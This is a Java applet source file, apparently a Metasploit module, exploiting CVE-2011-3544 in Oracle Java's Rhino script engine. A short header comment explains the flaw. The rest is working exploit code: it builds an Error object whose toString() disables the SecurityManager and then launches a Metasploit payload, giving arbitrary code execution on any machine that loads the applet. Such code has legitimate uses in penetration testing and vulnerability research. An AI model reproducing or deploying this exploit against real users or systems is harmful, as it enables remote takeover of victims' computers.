/*
* Oracle Java Applet Rhino Script Engine Remote Code Execution
* CVE-2011-3544
* ZDI-11-305
*
* This vulnerability is due to the way Rhino error objects are handled. Normally the script engine
* has to ensure untrusted code not being allowed to perform, but a malicious attacker can actually
* bypass this by creating an error object (which isn't checked by Rhino Script Engine), with a
* custom 'toString()' method to allow code being run with full privileges.  This also allows the
* attacker to disable Java SecurityManager, and then run abitrary code.
* 
* Ref:
* http://schierlm.users.sourceforge.net/CVE-2011-3544.html
*/

import java.applet.Applet;
import javax.script.*;
import javax.swing.JList;
import metasploit.Payload;

public class Exploit extends Applet {
	public void init() {
		try {
			ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
			Bindings b = engine.createBindings();
			b.put("applet", this);

			// Disable SecurityManager, and then run the payload
			// The error object isn't handled by Rhino, so the toString method
			// will not be restricted by access control
			Object proxy = (Object) engine.eval(
				"this.toString = function() {" +
				"	java.lang.System.setSecurityManager(null);" +
				"	applet.callBack();" +
				"	return String.fromCharCode(97 + Math.round(Math.random() * 25));" +
				"};" +
				"e = new Error();" +
				"e.message = this;" +
				"e", b);

			JList list = new JList(new Object[] {proxy});
			this.add(list);
		}
		catch (ScriptException e) {
			e.printStackTrace();
		}
	}

	public void callBack() {
		try {
			Payload.main(null);
		}
		catch (Exception e) {}
	}
}